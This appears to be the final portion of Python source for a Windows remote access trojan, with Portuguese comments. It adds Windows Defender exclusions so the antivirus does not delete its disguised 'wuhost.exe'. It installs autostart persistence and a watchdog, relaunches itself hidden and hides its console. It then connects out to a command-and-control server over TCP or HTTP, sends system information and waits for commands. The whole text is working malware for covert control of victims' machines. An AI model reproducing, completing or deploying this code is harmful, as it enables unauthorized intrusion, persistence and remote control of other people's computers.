            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=0x08000000, timeout=40)
    except Exception:
        pass


def harden():
    """Blindagem no alvo: exclusao no Defender, autostart e vigia.

    Sem a exclusao o proprio antivirus apaga o wuhost.exe em minutos -- foi o
    que derrubou as duas sessoes de uma vez.
    """
    if not IS_WIN:
        return "[!] so Windows"
    notes = []
    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)
    except OSError:
        pass

    marker = os.path.join(INSTALL_DIR, ".hard")
    if is_admin() and not os.path.isfile(marker):
        exe = os.path.join(INSTALL_DIR, "wuhost.exe")
        for cmd in ('Add-MpPreference -ExclusionPath "%s"' % INSTALL_DIR,
                    'Add-MpPreference -ExclusionProcess "%s"' % os.path.basename(exe)):
            try:
                r = subprocess.run(["powershell", "-NoProfile", "-NonInteractive",
                                    "-Command", cmd],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                   creationflags=0x08000000, timeout=90)
                notes.append("defender[%d]" % r.returncode)
            except Exception as exc:
                notes.append("defender: %s" % exc)
        try:
            with open(marker, "w", encoding="utf-8") as f:
                f.write(time.strftime("%Y-%m-%d %H:%M:%S"))
        except OSError:
            pass

    try:
        install()
        notes.append("persist: ok")
    except Exception as exc:
        notes.append("persist: %s" % exc)

    try:
        notes.append("vigia: " + _watchdog_vbs())
    except Exception as exc:
        notes.append("vigia: %s" % exc)
    return "; ".join(notes)


def main():
    global _KEY, TRANSPORT, HTTP_BASE, BOOTSTRAP
    host, port, key = parse_args(sys.argv[1:])
    if not key or str(key).startswith("r4f-0000"):
        key = KEY                      # veio a chave de exemplo: usa a embutida
    _KEY = key.encode() if isinstance(key, str) else key

    for i, a in enumerate(sys.argv):
        if a == "--http" and i + 1 < len(sys.argv):
            TRANSPORT, HTTP_BASE = "http", sys.argv[i + 1]
        elif a == "--bootstrap" and i + 1 < len(sys.argv):
            BOOTSTRAP = sys.argv[i + 1]
            if not HTTP_BASE:
                TRANSPORT = "http"

    if "--install" in sys.argv:
        try:
            install()
        except Exception:
            pass

    if STEALTH and "--no-stealth" not in sys.argv and "--visible" not in sys.argv:
        if stealth_relaunch():
            return                      # hidden copy takes over, this one exits
        if not single_instance():
            return
        _kill_duplicates()              # sobra so este processo

    if "--no-harden" not in sys.argv:
        try:
            harden()
        except Exception:
            pass

    if IS_WIN and "--visible" not in sys.argv:
        hide_console()

    if TRANSPORT == "http" and (BOOTSTRAP or HTTP_BASE):
        # o canal e a fonte da verdade: o endereco do C2 muda com o tunel.
        # o HTTP_BASE fixo so serve de fallback quando nao ha canal.
        http_loop("" if BOOTSTRAP else HTTP_BASE)   # never returns
        return

    delay = RECONNECT_MIN
    while True:
        sock = None
        try:
            sock = socket.create_connection((host, port), timeout=20)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.settimeout(None)
            send(sock, {"t": "hello", "info": sysinfo()})
            delay = RECONNECT_MIN
            serve(sock)
        except Exception:
            pass
        finally:
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass
        wait = STATE.get("sleep") or min(delay, RECONNECT_MAX)
        time.sleep(wait + random.uniform(0, wait * 0.4))
        delay = min(delay * 2, RECONNECT_MAX)


if __name__ == "__main__":
    main()
